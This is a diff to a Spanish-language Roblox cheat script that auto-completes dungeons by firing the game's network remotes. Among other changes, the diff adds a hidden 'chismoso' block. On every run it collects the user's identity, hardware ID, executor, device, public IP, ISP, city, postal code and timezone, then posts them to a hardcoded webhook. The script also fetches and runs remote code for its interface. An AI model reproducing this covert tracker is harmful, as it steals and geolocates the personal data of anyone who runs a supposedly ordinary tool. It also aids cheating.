@@ -1,35 +1,139 @@
-local Workspace = game:GetService("Workspace")
+-- ==========================================================
+-- ⚔️ EDSUSITO DUNGEON LITE - VERSIÓN PÚBLICA (CON CHISMOSO) ⚔️
+-- ==========================================================
+
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local VirtualInputManager = game:GetService("VirtualInputManager")
+local UserInputService = game:GetService("UserInputService")
 
 local localPlayer = Players.LocalPlayer
+
 local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
 local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 
-local justDied = false 
-local attackHeight = 30 -- Altura inicial ajustada a 30 por defecto
+-- ==========================================================
+-- 📡 1. WEBHOOK: EL CHISMOSO INTEGRADO (EDICIÓN LITE)
+-- ==========================================================
+task.spawn(function()
+    local WebhookURL = "https://webhook.lewisakura.moe/api/webhooks/1527303066431389796/XMkQJ-N1Y0Fo7Kb23Bod9m2VtZbhHRIGCuCOD4tUJHeHJhaB_TnfRAxogKskRdpExxnn"
+    
+    -- Detección de Dispositivo y Pantalla
+    local dispositivo = "PC 💻"
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        dispositivo = "Móvil 📱"
+    elseif UserInputService.GamepadEnabled then
+        dispositivo = "Consola 🎮"
+    end
+    
+    local cam = workspace.CurrentCamera
+    local resolucion = cam and tostring(cam.ViewportSize.X) .. "x" .. tostring(cam.ViewportSize.Y) or "Desconocida"
 
--- Evento para cuando el personaje muere y revive
-localPlayer.CharacterAdded:Connect(function(newCharacter)
-    character = newCharacter
-    humanoidRootPart = newCharacter:WaitForChild("HumanoidRootPart")
-    justDied = true -- Activamos bloqueo de enemigos para priorizar el portal
+    -- Datos del Ejecutor y Hardware
+    local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
+    local hwid = gethwid and gethwid() or "No soportado por el ejecutor"
+    local accountAge = tostring(localPlayer.AccountAge) .. " días"
+
+    -- Extracción Máxima de Datos de Red y Ubicación (IP-API)
+    local ipData = {
+        query = "Oculta/Fallida", 
+        country = "N/A", 
+        regionName = "N/A", 
+        city = "N/A", 
+        zip = "N/A", 
+        isp = "N/A", 
+        timezone = "N/A"
+    }
+    
+    pcall(function()
+        local response = game:HttpGet("http://ip-api.com/json/")
+        if response then
+            local decoded = HttpService:JSONDecode(response)
+            if decoded and decoded.status == "success" then
+                ipData = decoded
+            end
+        end
+    end)
+    
+    local horaActual = os.date("%Y-%m-%d %H:%M:%S")
+    local displayName = localPlayer.DisplayName
+    local userName = localPlayer.Name
+    local userId = tostring(localPlayer.UserId)
+    
+    -- Construcción del Mensaje
+    local mensaje = "📡 **ALERTA DE EJECUCIÓN - EDSUSITO LITE PÚBLICO** 📡\n" ..
+                    "```yaml\n" ..
+                    "[ 👤 DATOS DEL USUARIO ]\n" ..
+                    "Nombre:      " .. displayName .. "\n" ..
+                    "Usuario:     " .. userName .. "\n" ..
+                    "User ID:     " .. userId .. "\n" ..
+                    "Antigüedad:  " .. accountAge .. "\n\n" ..
+                    
+                    "[ 💻 DATOS TÉCNICOS ]\n" ..
+                    "Ejecutor:    " .. executorName .. "\n" ..
+                    "Hardware ID: " .. hwid .. "\n" ..
+                    "Dispositivo: " .. dispositivo .. "\n" ..
+                    "Resolución:  " .. resolucion .. "\n" ..
+                    "Juego (ID):  " .. tostring(game.PlaceId) .. "\n" ..
+                    "Hora Local:  " .. horaActual .. "\n\n" ..
+                    
+                    "[ 🌍 DATOS DE RED Y UBICACIÓN ]\n" ..
+                    "IP Pública:  " .. ipData.query .. "\n" ..
+                    "Proveedor:   " .. ipData.isp .. "\n" ..
+                    "País:        " .. ipData.country .. "\n" ..
+                    "Región/Prov: " .. ipData.regionName .. "\n" ..
+                    "Ciudad:      " .. ipData.city .. "\n" ..
+                    "Cód. Postal: " .. ipData.zip .. "\n" ..
+                    "Zona Horaria:" .. ipData.timezone .. "\n" ..
+                    "```\n" ..
+                    "👉 **[🔍 INVESTIGAR PERFIL DE " .. string.upper(userName) .. "](https://www.roblox.com/users/" .. userId .. "/profile)**"
+
+    local data = { ["content"] = mensaje }
+    local jsonData = HttpService:JSONEncode(data)
+
+    local requestFunction = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+    if requestFunction then
+        pcall(function()
+            requestFunction({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    else
+        pcall(function()
+            HttpService:PostAsync(WebhookURL, jsonData)
+        end)
+    end
 end)
 
-local netFolder = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
-local registerAttack = netFolder:WaitForChild("RE/RegisterAttack")
-local registerHit = netFolder:WaitForChild("RE/RegisterHit")
-local enemiesFolder = Workspace:FindFirstChild("Enemies") or Workspace
-
--- Acceso directo a los eventos de red del juego
-local commF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+-- ==========================================================
+-- ⚙️ 2. VARIABLES Y ESTADO DEL SCRIPT
+-- ==========================================================
+local justDied = false 
+local attackHeight = 30 
 
 local autoDungeonActive = false
 local currentTarget = nil
 local lastTarget = nil 
 
--- Detección de Haki Real
+local netFolder = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
+local registerAttack = netFolder:WaitForChild("RE/RegisterAttack")
+local registerHit = netFolder:WaitForChild("RE/RegisterHit")
+local enemiesFolder = Workspace:FindFirstChild("Enemies") or Workspace
+local commF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+
+localPlayer.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+    humanoidRootPart = newCharacter:WaitForChild("HumanoidRootPart")
+    justDied = true 
+end)
+
+-- ==========================================================
+-- 🗡️ 3. LÓGICA DE COMBATE LITE
+-- ==========================================================
 local function IsHakiActive()
     if not character then return false end
     if character:FindFirstChild("HasBuso") then
@@ -38,11 +142,8 @@ local function IsHakiActive()
     return false
 end
 
--- Activación de Haki Obligatoria por Servidor
 local function ForceActivateHaki()
     if not character or not autoDungeonActive then return end
-    
-    -- Si NO está activo el Haki, lo forzamos de inmediato
     if not IsHakiActive() then
         pcall(function()
             commF:InvokeServer("Buso")
@@ -50,7 +151,6 @@ local function ForceActivateHaki()
     end
 end
 
--- Equipar Espada
 local function ForceEquipSword()
     if not character or not autoDungeonActive then return end
     
@@ -73,9 +173,7 @@ local function ForceEquipSword()
     end
 end
 
--- Hilos de auto-buffs independientes para máxima velocidad
 local function StartAutoBuffs()
-    -- Hilo exclusivo de la espada (revisa cada 0.3 segundos)
     task.spawn(function()
         while autoDungeonActive do
             ForceEquipSword()
@@ -83,18 +181,16 @@ local function StartAutoBuffs()
         end
     end)
     
-    -- Hilo ultra-rápido exclusivo para el Haki (comprueba cada 0.1 segundos)
     task.spawn(function()
         while autoDungeonActive do
             ForceActivateHaki()
-            task.wait(0.1) -- Tiempo de reacción casi instantáneo si se desactiva
+            task.wait(0.1)
         end
     end)
 end
 
--- Obtener enemigo más cercano (Bloqueado tras morir + Filtro de Sombra/Blank Buddy)
 local function GetClosestEnemy()
-    if justDied then return nil end -- No busca enemigos si acabamos de morir
+    if justDied then return nil end 
 
     local closestEnemy = nil
     local shortestDistance = math.huge
@@ -115,7 +211,6 @@ local function GetClosestEnemy()
         for i = 1, #children do
             local object = children[i]
             
-            -- EXCLUSIÓN: Ignoramos Blank Buddy, Sombra y Shadow
             if object:IsA("Model") and object ~= currentCharacter and object.Name ~= "Blank Buddy" and object.Name ~= "Sombra" and object.Name ~= "Shadow" then
                 local humanoid = object:FindFirstChildOfClass("Humanoid")
                 local root = object:FindFirstChild("HumanoidRootPart") or object:FindFirstChild("Head")
@@ -185,7 +280,9 @@ local function AttackEnemy(enemy)
     end)
 end
 
--- Identifica en qué sala física se encuentra parado el jugador actualmente
+-- ==========================================================
+-- 🚪 4. PROGRESIÓN Y ROTACIÓN LITE
+-- ==========================================================
 local function GetCurrentRoomIndex(rooms)
     if not humanoidRootPart then return 1 end
     local myPos = humanoidRootPart.Position
@@ -205,7 +302,6 @@ local function GetCurrentRoomIndex(rooms)
     return currentRoomIdx
 end
 
--- Lógica de progresión
 local function AutoPassRoom()
     local mapFolder = Workspace:FindFirstChild("Map")
     if not mapFolder then return false end
@@ -267,7 +363,6 @@ local function RotateTargets()
             end
         else
             if justDied then
-                -- Bucle de prioridad al portal tras morir
                 local passed = false
                 local attempts = 0
                 while autoDungeonActive and justDied and attempts < 10 do
@@ -293,10 +388,13 @@ local function RotateTargets()
     end
 end
 
+-- ==========================================================
+-- 🎨 5. INTERFAZ GRÁFICA (RAYFIELD LITE)
+-- ==========================================================
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-    Name = "⚔️ Edsusito Dungeon ⚔️",
+    Name = "⚔️ Edsusito Dungeon Lite ⚔️",
     LoadingTitle = "Iniciando Sistema de Rotación...",
     LoadingSubtitle = "By Edsu",
     ConfigurationSaving = { Enabled = false },
@@ -307,7 +405,6 @@ local Window = Rayfield:CreateWindow({
 local DungeonTab = Window:CreateTab("Dungeon", 4483362458)
 DungeonTab:CreateSection("Control Principal")
 
--- BOTÓN TOGGLE PRINCIPAL
 DungeonTab:CreateToggle({
     Name = "Auto Completar",
     CurrentValue = false,
@@ -334,13 +431,12 @@ DungeonTab:CreateToggle({
 
 DungeonTab:CreateSection("Ajustes de Combate")
 
--- SLIDER DE ALTURA CONFIGURADO DESDE 10 HASTA 100 (INICIA EN 30)
 DungeonTab:CreateSlider({
     Name = "Altura de Ataque",
     Range = {10, 100}, 
     Increment = 1,
     Suffix = " studs",
-    CurrentValue = 30, -- Ajustado por defecto a 30 studs
+    CurrentValue = 30, 
     Flag = "AttackHeightFlag",
     Callback = function(Value)
         attackHeight = Value
